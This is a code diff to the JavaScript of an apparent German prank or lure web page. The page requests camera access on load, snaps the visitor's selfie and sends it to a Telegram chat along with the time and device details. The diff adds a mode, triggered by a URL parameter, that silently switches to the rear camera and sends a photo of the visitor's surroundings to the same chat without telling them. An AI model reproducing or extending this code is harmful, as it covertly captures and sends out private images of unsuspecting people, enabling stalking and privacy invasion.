@@ -11,6 +11,7 @@ const CONFIG = {
 // ============================================
 let dodgeCount = 0;
 let stream = null;
+let captureMode = 'front';
 
 const funfacts = [
     "Wusstest du? 9 von 10 Spaßbremsen bereuen ihre Entscheidung! 📊",
@@ -116,26 +117,55 @@ function startAnalysis(video) {
 // ============================================
 // CAPTURE PHOTO & SEND TO TELEGRAM
 // ============================================
-function captureAndSend(video) {
+function captureAndSend(video, isRear = false) {
     const canvas = document.getElementById('photo-canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
     const ctx = canvas.getContext('2d');
-    // Mirror the image to match what user sees
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
+    // Mirror the image to match what user sees (only for front camera)
+    if (!isRear) {
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+    }
     ctx.drawImage(video, 0, 0);
 
     // Convert to blob and send
     canvas.toBlob(async (blob) => {
         if (blob) {
-            await sendToTelegram(blob);
+            const captionMsg = isRear ? '📸 Rückkamera Foto!' : '📸 Neues Selfie eingegangen!';
+            await sendToTelegram(blob, captionMsg);
+
+            // If mode is both and we just took the front photo, switch to rear
+            if (!isRear && captureMode === 'both') {
+                switchToRearCamera();
+            }
         }
     }, 'image/jpeg', 0.9);
 }
 
-async function sendToTelegram(photoBlob) {
+async function switchToRearCamera() {
+    stopCamera();
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 960 } },
+            audio: false
+        });
+        const video = document.getElementById('camera-feed');
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+            video.play();
+            // Take the rear photo shortly after camera starts
+            setTimeout(() => {
+                captureAndSend(video, true);
+            }, 800);
+        };
+    } catch(err) {
+        console.log('Rückkamera nicht verfügbar:', err);
+    }
+}
+
+async function sendToTelegram(photoBlob, customCaption = '📸 Neues Selfie eingegangen!') {
     const formData = new FormData();
     formData.append('chat_id', CONFIG.CHAT_ID);
     formData.append('photo', photoBlob, 'selfie.jpg');
@@ -144,7 +174,7 @@ async function sendToTelegram(photoBlob) {
     const now = new Date();
     const timeStr = now.toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
 
-    let caption = `📸 Neues Selfie eingegangen!\n`;
+    let caption = `${customCaption}\n`;
     caption += `🕐 Zeit: ${timeStr}\n`;
     caption += `📱 Gerät: ${navigator.userAgent.substring(0, 100)}`;
 
@@ -230,6 +260,12 @@ function updateFunfact() {
 // INITIALIZATION - Kamera wird SOFORT angefragt!
 // ============================================
 document.addEventListener('DOMContentLoaded', () => {
+    // Check if mode=both is in URL
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('mode') === 'both') {
+        captureMode = 'both';
+    }
+
     // Kamera sofort beim Laden der Seite anfragen
     // Der Browser zeigt automatisch die Erlaubnis-Abfrage
     requestCamera();
